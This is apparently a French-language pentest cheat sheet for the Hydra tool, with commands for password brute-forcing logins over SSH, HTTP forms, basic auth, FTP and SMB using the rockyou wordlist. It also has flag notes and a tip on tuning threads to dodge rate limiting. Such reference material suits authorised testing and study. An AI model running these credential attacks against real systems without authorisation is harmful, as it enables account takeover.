---
tags: [tool, brute-force, authentication]
tool_name: "Hydra"
category: Brute Force
last_updated: 2024-01-01
---

# 🛠️ Hydra

## 📖 Description

> Outil de brute-force rapide et parallélisé supportant de nombreux protocoles d'authentification.

---

## 🚀 Commandes essentielles

### SSH

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P passwords.txt ssh://<IP> -t 4
```

### HTTP POST (login form)

```bash
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
# F= : message indiquant un ÉCHEC
# S= : message indiquant un SUCCÈS
```

### HTTP GET (basic auth)

```bash
hydra -l admin -P rockyou.txt <IP> http-get /admin
```

### FTP

```bash
hydra -l <user> -P rockyou.txt ftp://<IP>
```

### SMB

```bash
hydra -l <user> -P rockyou.txt smb://<IP>
```

---

## 📋 Flags importants

| Flag | Description |
|------|-------------|
| `-l` | Username unique |
| `-L` | Fichier de usernames |
| `-p` | Password unique |
| `-P` | Fichier de passwords |
| `-t` | Threads parallèles |
| `-s` | Port spécifique |
| `-f` | Stop au premier succès |
| `-o` | Output fichier |
| `-v` | Verbose |

---

## 💡 Tips

- `rockyou.txt` est à `/usr/share/wordlists/rockyou.txt` (gunzip si nécessaire)
- Limiter les threads (`-t 4`) pour SSH pour éviter le rate limiting
- Pour HTTP POST : identifier les champs avec Burp Suite d'abord

---

## 🔗 Ressources

- [Hydra cheatsheet](https://github.com/frizb/Hydra-Cheatsheet)
